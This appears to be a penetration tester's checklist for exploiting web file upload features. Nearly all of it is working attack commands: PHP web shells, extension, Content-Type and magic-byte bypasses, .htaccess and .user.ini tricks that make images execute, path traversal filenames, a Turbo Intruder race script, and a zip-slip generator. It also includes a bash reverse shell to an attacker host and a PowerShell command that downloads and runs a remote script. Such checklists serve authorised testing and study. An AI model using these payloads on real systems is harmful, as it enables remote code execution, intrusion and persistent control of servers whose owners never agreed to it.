# File upload

## First look
echo '<?php system($_GET["cmd"]); ?>' > shell.php
- [ ] One normal upload through Burp first: the error usually says which check failed
- [ ] Refused with no request sent: a JavaScript check, so the same request again from Repeater with shell.php
- [ ] Where uploads land, as THE-FOLDER below: the response, the page source, or a folder from :Pb discovery
- [ ] The language that runs there: PHP, ASP.NET on IIS, or Java on Tomcat

## The extension
- [ ] PHP: .php .phtml .php3 .php4 .php5 .php7 .phar .pht
- [ ] ASP.NET: .aspx .asp .ashx .asmx .cer .config
- [ ] Java: .jsp .jspx .war
- [ ] Case and doubles: .pHp, .php.jpg, .jpg.php, .php%00.jpg, .php., .p.phphp
The upload saved from Burp as upload.req, with FUZZ in place of .php in the filename:
ffuf -request upload.req -request-proto <Scheme> -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -ac

## Content-Type and magic bytes
In Burp, the file part's Content-Type changed to an image's, and nothing else:
Content-Type: image/jpeg
A GIF's first bytes in front of the code:
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.php
Or a real picture, <File>, with the code in its comment:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' <File>
cp <File> shell.php

## Server configuration files
Apache: .jpg run as PHP in the upload folder. The .htaccess goes up first, then the picture.
echo 'AddType application/x-httpd-php .jpg' > .htaccess
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.jpg
PHP-FPM, often behind nginx: shell.png run in front of every PHP file in the folder, within five minutes.
echo 'auto_prepend_file=shell.png' > .user.ini
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.png
- [ ] Then any .php in THE-FOLDER requested with ?cmd=id

## Out of the upload folder
The filename in the request, when the folder does not run code:
filename="../shell.php"
filename="..%2f..%2fshell.php"
filename="../../../../../../var/www/html/shell.php"

## Run it
curl -sk "<Scheme>://<WebHost>/THE-FOLDER/shell.php?cmd=id"
rlwrap nc -lvnp <LPORT>
curl -sk -G "<Scheme>://<WebHost>/THE-FOLDER/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
Windows, a reverse shell script from :Pb shells served on port 80:
curl -sk -G "<Scheme>://<WebHost>/THE-FOLDER/shell.php" --data-urlencode "cmd=powershell -c \"iex (iwr -UseBasicParsing http://<LHOST>/rev.ps1)\""
- [ ] Ready-made shells for IIS and Tomcat in /usr/share/webshells/, aspx and jsp
- [ ] Nothing connects: ports 80, 443 or 53 for <LPORT>, which a firewall lets out more often
- [ ] Every file I upload noted, and removed at the end

## Saved, checked, then deleted
For a file deleted a moment after upload, Turbo Intruder sends the upload and ten requests for it at once.
The payload writes a shell that stays:
echo '<?php file_put_contents("s.php", "<?php system(\$_GET[\"cmd\"]); ?>"); ?>' > race.php
In Burp, the upload of race.php sent to Turbo Intruder, with its script replaced by:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)
    fetch = 'GET /THE-FOLDER/race.php HTTP/1.1\r\nHost: <WebHost>\r\nCookie: THE-COOKIE\r\n\r\n'
    engine.queue(target.req, gate='race')
    for i in range(10):
        engine.queue(fetch, gate='race')
    engine.openGate('race')
def handleResponse(req, interesting):
    table.add(req)
curl -sk "<Scheme>://<WebHost>/THE-FOLDER/s.php?cmd=id"
- [ ] Lost the race: more fetches, or the attack run a few more times

## Archives the app unpacks
Python keeps ../ in the names, where zip strips it. One entry for each depth, each with its own name:
python3 -c "import zipfile; z=zipfile.ZipFile('slip.zip','w'); [z.write('shell.php', '../'*n + 'slip%d.php' % n) for n in range(1, 9)]; z.close()"
unzip -l slip.zip
for n in 1 2 3 4 5 6 7 8; do curl -sk -o /dev/null -w "%{http_code} slip$n\n" "<Scheme>://<WebHost>/slip$n.php"; done
- [ ] The one that answers 200 run with ?cmd=id
- [ ] Nothing at the web root: one entry named ../../../../../../../../var/www/html/slip.php, which lands from any depth
